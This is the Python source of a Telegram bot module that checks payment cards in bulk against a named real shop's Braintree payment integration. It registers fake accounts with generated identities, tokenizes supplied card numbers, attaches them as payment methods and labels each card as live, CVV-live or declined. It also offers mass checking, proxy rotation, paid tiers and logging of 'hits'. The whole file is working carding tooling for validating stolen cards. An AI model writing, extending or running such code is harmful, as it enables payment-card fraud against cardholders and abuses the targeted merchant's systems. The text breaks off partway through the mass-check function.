# ============ BRAINTREE AUTH GATEWAY (DNA LASERING) ============
# Add this to your f13.py

import requests
import re
import base64
import json
import asyncio
import traceback
import random
from typing import Dict, Tuple, Optional, List
from datetime import datetime
from faker import Faker
from user_agent import generate_user_agent

# Active tasks for Braintree Auth
braintree_auth_active_tasks = {}

# ============ BRAINTREE AUTH CONFIG ============
BRAINTREE_AUTH_URL = "https://www.dnalasering.com"
BRAINTREE_AUTH_REGISTER_URL = f"{BRAINTREE_AUTH_URL}/my-account/"
BRAINTREE_AUTH_ADD_PAYMENT = f"{BRAINTREE_AUTH_URL}/my-account/add-payment-method/"
BRAINTREE_AUTH_EDIT_ADDRESS = f"{BRAINTREE_AUTH_URL}/my-account/edit-address/billing/"
BRAINTREE_AUTH_AJAX = f"{BRAINTREE_AUTH_URL}/wp-admin/admin-ajax.php"
BRAINTREE_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"

def generate_braintree_user_data():
    """Generate fake user data for Braintree registration"""
    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@gmail.com"
    name = f"{first_name} {last_name}"
    phone = f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, phone

async def check_card_braintree_auth(card: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
    """
    Check card using Braintree Auth gateway via DNA Lasering
    This creates a payment method and adds it to the account
    """
    print(f"\n{'='*80}")
    print(f"💳 [BRAINTREE AUTH] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    else:
        print(f"🔌 No proxy - direct connection")
    if retry_count > 0:
        print(f"🔄 RETRY ATTEMPT #{retry_count}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "$0.00",
        "gateway": "Braintree Auth"
    }
    
    try:
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        cc, mm, yy, cvv = parts
        
        # Format year (API expects 4-digit)
        if len(yy) == 2:
            yy = f"20{yy}"
        
        # Generate user data
        email, name, phone = generate_braintree_user_data()
        print(f"👤 User: {name} | 📧 {email} | 📞 {phone}")
        
        # Setup session with proxy
        session = requests.Session()
        if proxy:
            proxy_url = format_proxy(proxy)
            if proxy_url:
                session.proxies = {'http': proxy_url, 'https': proxy_url}
                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
        
        start_time = time.time()
        user_agent = generate_user_agent()
        
        # ============ STEP 1: Get Registration Nonce ============
        print(f"\n📡 [STEP 1] Getting registration nonce...")
        
        response = session.get(
            BRAINTREE_AUTH_REGISTER_URL,
            headers={'User-Agent': user_agent},
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"❌ Failed to get registration page: HTTP {response.status_code}")
            default_result["message"] = "Failed to get registration page"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        # Extract registration nonce
        reg_nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
        if not reg_nonce_match:
            print("❌ Could not find registration nonce")
            default_result["message"] = "Could not find registration nonce"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        reg_nonce = reg_nonce_match.group(1)
        print(f"✅ Registration nonce: {reg_nonce[:20]}...")
        
        # ============ STEP 2: Register Account ============
        print(f"\n📡 [STEP 2] Registering account...")
        
        register_data = {
            'email': email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.dnalasering.com/my-account/payment-methods/',
            'wc_order_attribution_session_start_time': '2026-05-27 03:41:14',
            'wc_order_attribution_session_pages': '3',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_agent,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        register_headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/',
            'user-agent': user_agent,
        }
        
        response = session.post(
            BRAINTREE_AUTH_REGISTER_URL,
            headers=register_headers,
            data=register_data,
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"❌ Registration failed: HTTP {response.status_code}")
            default_result["message"] = "Registration failed"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        print(f"✅ Account registered: {email}")
        
        # ============ STEP 3: Edit Billing Address ============
        print(f"\n📡 [STEP 3] Setting billing address...")
        
        response = session.get(
            BRAINTREE_AUTH_EDIT_ADDRESS,
            headers={'User-Agent': user_agent},
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"⚠️ Failed to get edit address page: HTTP {response.status_code}")
            # Continue anyway
        
        # Extract edit address nonce
        edit_nonce_match = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
        edit_nonce = edit_nonce_match.group(1) if edit_nonce_match else ''
        print(f"✅ Edit address nonce: {edit_nonce[:20] if edit_nonce else 'Not found'}...")
        
        address_headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/edit-address/billing/',
            'user-agent': user_agent,
        }
        
        address_data = {
            'billing_first_name': name.split()[0] if ' ' in name else name,
            'billing_last_name': name.split()[-1] if ' ' in name else name,
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': 'Hollow park city 49',
            'billing_address_2': '',
            'billing_city': 'New york',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': phone,
            'billing_email': email,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': edit_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }
        
        response = session.post(
            BRAINTREE_AUTH_EDIT_ADDRESS,
            cookies=session.cookies,
            headers=address_headers,
            data=address_data,
            timeout=30
        )
        
        print(f"✅ Billing address set")
        
        # ============ STEP 4: Get Add Payment Method Page ============
        print(f"\n📡 [STEP 4] Getting add payment method page...")
        
        response = session.get(
            BRAINTREE_AUTH_ADD_PAYMENT,
            headers={'User-Agent': user_agent},
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"❌ Failed to get add payment page: HTTP {response.status_code}")
            default_result["message"] = "Failed to get add payment page"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        # Extract add payment nonce
        payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
        payment_nonce = payment_nonce_match.group(1) if payment_nonce_match else ''
        print(f"✅ Payment nonce: {payment_nonce[:20] if payment_nonce else 'Not found'}...")
        
        # Extract client token nonce
        client_token_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
        if not client_token_match:
            client_token_match = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', response.text)
        client_token_nonce = client_token_match.group(1) if client_token_match else ''
        print(f"✅ Client token nonce: {client_token_nonce[:20] if client_token_nonce else 'Not found'}...")
        
        if not client_token_nonce:
            print("❌ Could not find client token nonce")
            default_result["message"] = "Could not find client token nonce"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        # ============ STEP 5: Get Braintree Client Token ============
        print(f"\n📡 [STEP 5] Getting Braintree client token...")
        
        ajax_data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }
        
        ajax_headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.dnalasering.com',
            'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
        }
        
        response = session.post(
            BRAINTREE_AUTH_AJAX,
            headers=ajax_headers,
            data=ajax_data,
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"❌ Failed to get client token: HTTP {response.status_code}")
            default_result["message"] = "Failed to get client token"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        try:
            ajax_result = response.json()
            decoded = base64.b64decode(ajax_result['data']).decode('utf-8')
            auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')
            print(f"✅ Auth fingerprint obtained: {auth_fingerprint[:30] if auth_fingerprint else 'Not found'}...")
        except Exception as e:
            print(f"❌ Failed to decode client token: {e}")
            default_result["message"] = "Failed to decode client token"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        if not auth_fingerprint:
            print("❌ Could not get auth fingerprint")
            default_result["message"] = "Could not get auth fingerprint"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        # ============ STEP 6: Tokenize Credit Card ============
        print(f"\n📡 [STEP 6] Tokenizing credit card...")
        
        # Determine card brand
        card_brand = "visa"
        if cc.startswith('5'):
            card_brand = "mastercard"
        elif cc.startswith('3'):
            card_brand = "amex"
        elif cc.startswith('6'):
            card_brand = "discover"
        
        # Format year for Braintree (4-digit)
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        graphql_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy_full,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        graphql_headers = {
            'authority': 'payments.braintree-api.com',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user_agent,
        }
        
        response = session.post(
            BRAINTREE_GRAPHQL_URL,
            headers=graphql_headers,
            json=graphql_payload,
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"❌ Tokenization failed: HTTP {response.status_code}")
            default_result["message"] = "Tokenization failed"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        try:
            graphql_result = response.json()
            token = graphql_result.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            if not token:
                print("❌ Could not get payment token")
                default_result["message"] = "Could not get payment token"
                default_result["elapsed"] = time.time() - start_time
                return default_result
            print(f"✅ Payment token obtained: {token[:20]}...")
        except Exception as e:
            print(f"❌ Failed to parse tokenization response: {e}")
            default_result["message"] = "Failed to parse tokenization response"
            default_result["elapsed"] = time.time() - start_time
            return default_result
        
        # ============ STEP 7: Add Payment Method ============
        print(f"\n🔥 [STEP 7] Adding payment method...")
        
        add_payment_headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        
        add_payment_data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', card_brand),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', token),
            ('wc_braintree_device_data', '{}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'USD'),
            ('wc_braintree_paypal_locale', 'en_us'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', payment_nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]
        
        response = session.post(
            BRAINTREE_AUTH_ADD_PAYMENT,
            cookies=session.cookies,
            headers=add_payment_headers,
            data=add_payment_data,
            timeout=30
        )
        
        elapsed = time.time() - start_time
        
        # ============ STEP 8: Parse Result ============
        print(f"\n📥 Payment Result Status: {response.status_code}")
        
        # Check for success
        if "Payment method successfully added" in response.text:
            print(f"\n✅✅✅ PAYMENT METHOD ADDED! Card is LIVE ✅✅✅")
            return {
                "status": "success",
                "result": "APPROVED",
                "message": "Payment method successfully added - Card is LIVE",
                "status_display": "✅ APPROVED",
                "status_category": "approved",
                "elapsed": elapsed,
                "price": "$0.00",
                "gateway": "Braintree Auth",
                "token": token[:20] + "..."
            }
        
        # Check for error messages
        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
        if error_match:
            error_text = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
            print(f"❌ Error: {error_text}")
            
            # Parse error
            error_lower = error_text.lower()
            if "insufficient" in error_lower or "funds" in error_lower:
                return {
                    "status": "success",
                    "result": "INSUFFICIENT_FUNDS",
                    "message": f"Insufficient funds: {error_text}",
                    "status_display": "💰 INSUFFICIENT FUNDS",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Braintree Auth"
                }
            elif "cvv" in error_lower or "security" in error_lower:
                return {
                    "status": "success",
                    "result": "CVV_LIVE",
                    "message": f"CVV verification failed: {error_text}",
                    "status_display": "✅ CVV LIVE",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Braintree Auth"
                }
            elif "declined" in error_lower:
                return {
                    "status": "declined",
                    "result": "DECLINED",
                    "message": f"Card declined: {error_text}",
                    "status_display": "❌ DECLINED",
                    "status_category": "declined",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Braintree Auth"
                }
            elif "expired" in error_lower:
                return {
                    "status": "declined",
                    "result": "EXPIRED",
                    "message": f"Expired card: {error_text}",
                    "status_display": "❌ EXPIRED",
                    "status_category": "declined",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Braintree Auth"
                }
            elif "3d" in error_lower or "secure" in error_lower:
                return {
                    "status": "declined",
                    "result": "3DS_REQUIRED",
                    "message": f"3D Secure required: {error_text}",
                    "status_display": "🔐 3DS REQUIRED",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Braintree Auth"
                }
            else:
                return {
                    "status": "declined",
                    "result": "DECLINED",
                    "message": error_text,
                    "status_display": "❌ DECLINED",
                    "status_category": "declined",
                    "elapsed": elapsed,
                    "price": "$0.00",
                    "gateway": "Braintree Auth"
                }
        
        # Check for success indicators in response
        if "success" in response.text.lower() and "error" not in response.text.lower():
            print(f"\n✅✅✅ PAYMENT METHOD ADDED! Card is LIVE ✅✅✅")
            return {
                "status": "success",
                "result": "APPROVED",
                "message": "Payment method successfully added",
                "status_display": "✅ APPROVED",
                "status_category": "approved",
                "elapsed": elapsed,
                "price": "$0.00",
                "gateway": "Braintree Auth"
            }
        
        # Default: declined
        print("❌ Card declined - Unknown reason")
        return {
            "status": "declined",
            "result": "DECLINED",
            "message": "Card declined",
            "status_display": "❌ DECLINED",
            "status_category": "declined",
            "elapsed": elapsed,
            "price": "$0.00",
            "gateway": "Braintree Auth"
        }
        
    except requests.Timeout:
        print(f"⏰ Request timeout")
        default_result["message"] = "Request timeout"
        default_result["elapsed"] = time.time() - start_time
        return default_result
    except requests.ConnectionError as e:
        print(f"❌ Connection error: {e}")
        default_result["message"] = f"Connection error: {str(e)[:50]}"
        default_result["elapsed"] = time.time() - start_time
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        traceback.print_exc()
        default_result["message"] = str(e)[:100]
        default_result["elapsed"] = time.time() - start_time
        return default_result


def format_braintree_auth_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Braintree Auth response for display"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Braintree Auth")
    price = result.get("price", "$0.00")
    
    # Parse card for display
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Clean message
    clean_message = message[:80]
    if len(message) > 80:
        clean_message += "..."
    
    # Format country with flag
    country_name = country.replace('🌐', '').strip()
    flag_map = {
        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
    }
    country_flag = "🌍"
    for key, flag in flag_map.items():
        if key in country_name.upper():
            country_flag = flag
            break
    
    # Format bank name
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Determine emoji based on status
    if "CHARGED" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        status_text = "CHARGED"
    elif "INSUFFICIENT" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
        status_text = "INSUFFICIENT FUNDS"
    elif "CVV LIVE" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        status_text = "CVV LIVE"
    elif "3D" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
        status_text = "3D REQUIRED"
    elif "APPROVED" in status_display:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        status_text = "APPROVED"
    else:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        status_text = "DECLINED"
    
    # Build output
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_emoji} {status_text}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category


# ============ BRAINTREE AUTH SINGLE CHECK ============

@check_gateway("braintree_auth")
async def single_check_braintree_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Braintree Auth gateway - /b3 <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Braintree Auth Gateway</b>\n\n"
            "Usage: <code>/b3 &lt;card&gt;</code>\n"
            "Example: <code>/b3 4111111111111111|12|2028|123</code>\n\n"
            "💰 Amount: $0.00 (Payment Method Addition)\n"
            "📍 Gateway: Braintree via DNA Lasering\n"
            "✅ Checks: CVV Live, 3DS, Insufficient Funds",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2028|123"
        )
        return
    
    # Check credits
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'braintree'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Braintree Auth not available for {tier.upper()} tier</b>\n\n"
            f"Upgrade to Premium/Ultimate to use this gateway.",
            parse_mode=ParseMode.HTML
        )
        add_user_credits(user_id, 1)
        return
    
    braintree_auth_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text("🔄 Checking card with Braintree Auth...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
                if proxy_list:
                    proxy_str = proxy_list[0]
                    print(f"🔌 [Braintree Auth] Using proxy: {mask_proxy(proxy_str)}")
        
        result = await check_card_braintree_auth(card, proxy_str, user_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        ui, status_category = format_braintree_auth_response(result, card, bin_info)
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        if status_category in ["charged", "approved"]:
            await save_hit_to_file(
                card=card, gateway="Braintree Auth",
                response=result.get("message", "Approved"),
                price="$0.00",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            if status_category == "charged":
                user_data = user_manager.get_user(user_id)
                await send_hit_notification(
                    context=context, gateway="Braintree Auth", card=card,
                    response=result.get("message", "Charged"),
                    price="$0.00",
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        # Show remaining credits for free users
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Braintree Auth] Error: {traceback.format_exc()}")
        add_user_credits(user_id, 1)
    finally:
        braintree_auth_active_tasks.pop(user_id, None)


# ============ BRAINTREE AUTH MASS CHECK ============

@check_gateway("braintree_auth")
async def mass_check_braintree_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Braintree Auth gateway - /mb3 <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not user_manager.can_access_gateway(user_id, 'braintree'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Braintree Auth not available for {tier.upper()} tier.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
            f"Use /b3 for single checks.\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if reply to file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            cards = []
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
            
            if not cards:
                await message.reply_text("❌ No valid cards found in file.")
                return
                
            await message.delete()
            await braintree_auth_mass_check_logic(update, context, cards, None)
            return
            
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    
    if not context.args:
        await message.reply_text(
            "📦 <b>Braintree Auth Mass Check</b>\n\n"
            "Usage: <code>/mb3 &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a .txt file with /mb3\n\n"
            "Example: <code>/mb3 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
            "💰 Amount: $0.00 (Payment Method Addition)\n"
            "📍 Gateway: Braintree via DNA Lasering\n"
            "✅ Only approved cards will be shown\n"
            "❌ Declined cards are hidden from chat",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
    
    # Check credits for mass check (1 credit per card for free users)
    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    try:
        await message.delete()
    except:
        pass
    
    await braintree_auth_mass_check_logic(update, context, cards, None)


async def braintree_auth_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for Braintree Auth gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [BRAINTREE AUTH MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    # Get user's working proxies
    user_proxies = []
    if user_manager.can_use_proxy(u_id):
        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
    
    stats = {
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    proxy_index = 0
    
    try:
        braintree_auth_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        # Process 5 cards at a time (Braintree is slower)
        CONCURRENCY = 5
        BATCH_SIZE = 5
        
        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
        
        if progress_msg is None:
            progress_text = (
                f"<b>Gateway</b> ➛ Braintree Auth\n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed_count = 0
        
        async def update_progress(current: int):
            if current > 0 and current < total and current % 5 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            if current >= total:
                status_text = "FINISHED ✅"
            else:
                status_text = f"PROCESSING {current}/{total}"
            
            progress_text = (
                f"<b>Gateway</b> ➛ Braintree Auth\n"
                f"<b>Status</b> ➛ {status_text}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
